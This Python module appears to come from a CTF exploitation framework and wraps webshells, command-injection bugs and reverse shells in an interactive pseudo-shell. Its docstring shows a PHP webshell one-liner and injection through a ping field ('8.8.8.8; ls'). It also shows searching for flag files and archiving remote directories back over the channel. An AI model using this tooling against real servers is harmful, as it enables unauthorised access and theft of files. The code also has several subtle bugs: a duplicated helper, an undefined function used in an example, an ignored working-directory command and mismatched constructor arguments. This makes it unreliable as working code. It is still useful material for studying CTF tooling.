"""
This modules provides utilities to "simulate" a nice shell even if you only
have something that only provides rudimentary command execution, such as a
webshell or a crude exploit. It also has several convenience methods to make it
easy to search for flags or download certain directories over the channel.

For example to create a such a simulated shell over a Tube, you can do this:

    >>> x = process("/bin/sh")
    >>> sh = ShellSim(x)
    >>> print sh.e("ls")  # execute a single command
    flag.txt something_else.txt pwnme
    >>> sh.interactive()  # switch to interactive mode
    >>> sh.close()  # also closes the tube

But we cannot only pass a tube, but also a function that implements an exploit.

    >>> def something(cmd):
    ...    r = remote("127.0.0.1", 1337)
    ...    r.sendline(cmd)
    ...    s = r.recvall()
    ...    r.close()
    ...    return s
    ...
    >>> sh = ShellSim(something)
    >>> sh.interactive()

For convenience there is also a client for webshells. In this example we create
a wrapper around the webshell. By default requests are performed using a get
request. In this example the contents returned by
`http://vuln.example.com/ws.php?cmd=ls` are printed directly.

    >>> ws = WebShellClient('http://vuln.example.com/ws.php', "cmd")
    >>> print ws.command("ls")
    flag.txt ws.php config.php
    >>> ws.interactive()

Sometimes we have a command execution vulnerability and not a complete
webshell. For example in the classical ping command execution scenario. Let's
assume that we need to actually pass an ip address first.

    >>> ws = WebShellClient("http://vuln.example.com/ping.php", "addr")
    >>> print ws.command("8.8.8.8; ls")
    PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
    64 bytes from 8.8.8.8: icmp_seq=1 ttl=56 time=14.4 ms
    64 bytes from 8.8.8.8: icmp_seq=2 ttl=56 time=14.0 ms
    64 bytes from 8.8.8.8: icmp_seq=3 ttl=56 time=13.8 ms

    --- 8.8.8.8 ping statistics ---
    3 packets transmitted, 3 received, 0% packet loss, time 2002ms
    rtt min/avg/max/mdev = 13.882/14.123/14.426/0.226 ms
    flag.txt
    ping.php
    >>> ws.pre = lambda cmd: "127.0.0.1; " + cmd
    >>> ws.post = shellsim.from_line(8)
    >>> print ws.command("ls")
    flag.txt
    ping.php


A very useful method for CTF scenarios is the following method:

    >>> sh = ShellSim(something)
    >>> # this will use the find command to print all the files
    >>> # that match the regex.
    >>> sh.print_all_files_like(".*flag.*", "/home/ctf/")
    ---- /home/ctf/flag.txt ----
    CTF{omgwtf_I_got_a_flag}
    ---- /home/ctf/somedir/real_flag.txt ----
    CTF{jk_this_is_the_r3al_flag}


    >>> pprint(sh.read_all_files_like(".*flag.*", '/home/ctf'))
    {'/home/ctf/flag.txt': 'CTF{omgwtf_I_got_a_flag}\n',
     '/home/ctf/somedir/real_flag.txt': 'CTF{jk_this_is_the_r3al_flag}\n'}

    >>> # wrapper to perform `grep -ri 'CTF' /home/ctf`
    >>> print sh.grep_for("CTF", "/home/ctf", i=True)
    ./flag.txt:CTF{omgwtf_I_got_a_flag}
    ./somedir/real_flag.txt:CTF{jk_this_is_the_r3al_flag}


If you want to dump the files from the server:

    >>> sh = ShellSim(something)
    >>> # this will download a .tar.gz file into './downloads', which contains
    >>> # the contents of /home/ctf
    >>> print sh.download("/home/ctf")
    Written contents of /home/ctf file to /home/user/downloads/_home_ctf-2016-10-13T15:32:33.tar.gz


"""

import os
import sys
import binascii
import shlex
import requests
from base64 import b64decode
from datetime import datetime
from .. import term
from ..tubes import tube, remote
from ..timeout import Timeout
from ..log import getLogger


log = getLogger(__name__)


class _OnTubeExecutor(object):

    def __init__(self, tube):
        self.tube = tube
        self.timeout = 0.05

    def __call__(self, cmd):
        self.tube.sendline(cmd)
        response = []
        while self.tube.can_recv(timeout=self.timeout):
            cur = self.tube.recv(timeout=self.timeout)
            cur = cur.replace('\r\n', '\n')
            response.append(cur)
        return "".join(response)


class ShellSim(object):

    def __init__(self, how, pre=None, post=None, onlyascii=True,
            download_dir="./downloads/"):
        self.onlyascii = onlyascii
        self.download_dir = download_dir
        self.tube = None
        if isinstance(how, tube.tube):
            self.tube = how
            self.real_execute = _OnTubeExecutor(how)
            pass
        elif callable(how):
            self.real_execute = how
        else:
            def bail_out(**args):
                raise ValueError("Tried to call uncallable ShellSim parameter how")
            self.real_execute = bail_out

        if pre is not None:
            self.pre = pre
        else:
            self.pre = lambda x: x
        if post is not None:
            self.post = post
        else:
            self.post = lambda x: x
        self.onclose = None

        self._handlers = {':download': self.download,
                          # ':upload': self.upload,
                          ':printlike': self.print_all_files_like,
                          'exit': self.close,
                          ':exit': self.close,
                          'cd': self.cd,
                          'pwd': self.pwd}
        self._cwd = ''
        self._user = ''
        self._host = ''
        self.prompt = term.text.bold_blue('{user}') \
                + '@{host} ' + term.text.bold("{cwd}") + ' > '
        self.get_remote_info()
        self.__marker = None

    def execute(self, cmd):
        if self._cwd:
            cd_cmd = "cd '{}' && {}".format(self._cwd, cmd)
        else:
            cd_cmd = cmd
        return self.post(self.real_execute(self.pre(cd_cmd)))

    def _get_prompt(self):
        return self.prompt.format(user=self._user, host=self._host, cwd=self._cwd)

    def get_remote_info(self):
        marker = '---next---'
        cmds = ['whoami', 'pwd', 'hostname']
        x = ";echo \"{}\";".format(marker).join(cmds)
        res = self.execute(x)
        if not res:
            log.warn("get remote info failed")
            return
        self._user, self._cwd, self._hostname = map(lambda s: s.strip(),
                                                    res.split(marker))

    def command(self, cmd):
        if isinstance(cmd, str):
            cmd = shlex.split(cmd)
        try:
            if cmd[0] in self._handlers:
                return self._handlers[cmd[0]](*cmd[1:])
            else:
                return self.execute(" ".join(cmd))
        except Exception as e:
            log.warn("Got exception during processing of command: {}\n{}"
                     .format(cmd, e))
            return ""

    e = command

    def interactive(self):
        go = True
        try:
            while go:
                if term.term_mode:
                    data = term.readline.readline(prompt = self._get_prompt(), float = True)
                else:
                    data = sys.stdin.readline()

                if data:
                    if not data.strip():
                        continue

                    try:
                        res = self.command(data)
                        sys.stdout.write(res)
                        if not res or res[-1] != "\n":
                            sys.stdout.write("\n")
                        sys.stdout.flush()
                    except EOFError:
                        go = False
                        log.info('Got EOF while sending in interactive')
                else:
                    go = False
        except KeyboardInterrupt:
            log.warn('Interrupted')

    def download(self, path):
        """
        Download a directory or file as a .tar.gz to self.downloads_dir, which
        defaults to './downloads/'.
        """
        cmd = "tar cz '{}' 2>/dev/null"
        if self.onlyascii:
            cmd = "tar cz '{}' 2>/dev/null|base64"
        abspath = path
        if not path.startswith("/") and self._cwd:
            abspath = os.path.abspath(self._cwd + "/" + path)
        res = self.execute(cmd.format(abspath))
        if self.onlyascii:
            res = res.replace("\n", "").strip()
            res = b64decode(res)
        now = (datetime.now().isoformat().split("."))[0]
        tarname = path.replace("/", "_").replace(".", "_") \
                  + "-" + now + ".tar.gz"
        if not os.path.exists(self.download_dir):
            os.mkdir(self.download_dir)
        fname = os.path.join(self.download_dir, tarname)
        fname = os.path.abspath(fname)
        # log.debug(str(res))
        # log.debug(type(res))
        with open(fname, "wb") as f:
            f.write(bytes(res))
        return "Written contents of {} file to {}".format(abspath, fname)

    def upload(self, path):
        raise NotImplementedError()
        # TODO: "upload" a file. maybe use base64 or just cat the lines into
        # the file one by one or something...

        # if not os.path.exists(path):
        #     self.error("cannot upload '{}' because it does not exit!"
        #                .format(path))
        # else:
        #     with open('path', 'rb') as f:
        #         content = f.read()
        return ""

    def cd(self, dir='~'):
        assert dir
        if dir[0] != "/" and dir[0] != "~" and self._cwd:
            self._cwd = os.path.abspath(self._cwd + "/" + dir)
        else:
            self._cwd = dir
        return ""

    def pwd(self):
        return self._cwd

    def close(self):
        if self.tube:
            self.execute("exit")
            self.tube.close()
        if self.onclose:
            self.onclose()

    def read_all_files_like(self, regex, indir='/'):
        if not self.__marker:
            self.__marker = "-_- o_O {} O_o -_-"\
                    .format(binascii.hexlify(os.urandom(10)))
        marker = self.__marker
        printf = marker + "\\n%p\\n" + marker
        cmdtpl = "find '{}' -regex '{}' -readable -type f -printf '{}'" + \
                 " -exec cat '{{}}' \; 2>/dev/null"
        cmd = cmdtpl.format(indir, regex, printf)
        res = self.execute(cmd)
        splitted = res.split(marker)[1:]
        i = iter(splitted)
        return {k.strip(): v for k, v in zip(i, i)}

    def print_all_files_like(self, regex, indir='/'):
        printf = "---- %p ----\\n"
        cmdtpl = "find '{}' -regex '{}' -readable -type f -printf '{}'" + \
                " -exec cat '{{}}' \; 2>/dev/null"
        cmd = cmdtpl.format(indir, regex, printf)
        res = self.execute(cmd)
        # sys.stdout.write(res)
        # sys.stdout.flush()
        return res


class WebShellClient(ShellSim):
    """
    This assumes a webshell endpoint, that just spits out the result of the
    command. i.e. something like

        <?php echo system($_GET['cmd']) ?>

    You can then do something like this:

        ws = WebShellClient('http://vuln.example.com/sh.php', "cmd")
        print ws.command("ls")
        ws.interactive()

    To get a rather nice looking shell.
    """

    def __init__(self, url, param=None, data={}, method='GET',
                 download_dir="./downloads/"):
        super(WebShellClient, self).__init__(self, None, onlyascii=True,
                                             download_dir=download_dir)
        self.url = url
        self.param = param
        self.method = method
        self.data = data
        self._session = requests.session()

    def execute(self, cmd):
        if self._cwd:
            cd_cmd = "cd '{}' && {}".format(self._cwd, cmd)
        else:
            cd_cmd = "{}".format(cmd)

        data = self.data.copy()
        data[self.param] = cmd
        if self.method.lower() == 'get':
            res = self._session.get(self.url, data=data)
        elif self.method.lower() == 'post':
            res = self._session.post(self.url, data=data)

        return res.text


class ReverseShellClient(ShellSim):
    """
    Usage:

        rs = ReverseShellClient('vuln.example.com', 1234)
        rs.interactive()

    """

    def __init__(self, host, port, download_dir="./downloads/"):
        super(ReverseShellClient, self).__init__(self,
                                                 None,
                                                 onlyascii=False,
                                                 download_dir=download_dir)
        self.tube = remote(host, port)
        self.real_execute = _OnTubeExecutor(self.tube)


# these are convenience factory methods for pre/post functions, that can be
# passed.


def tail_bytes(N):
    return lambda buf: buf[N:]


def head_bytes(N):
    return lambda buf: buf[N:]


tail_chars = tail_bytes
head_chars = head_bytes


def head_lines(N):
    return lambda buf: "\n".join(buf.split("\n")[:N])


def tail_lines(N):
    return lambda buf: "\n".join(buf.split("\n")[N:])


def from_line_to_line(from_, to_):
    return lambda buf: "\n".join(buf.split("\n")[from_:to_])


def from_byte_to_byte(from_, to_):
    return lambda buf: buf[from_:to_]


def replace_escaped_nl():
    return lambda buf: buf.replace("\\n", "\n")


def strip_nl():
    return lambda buf: buf.replace("\n", "")
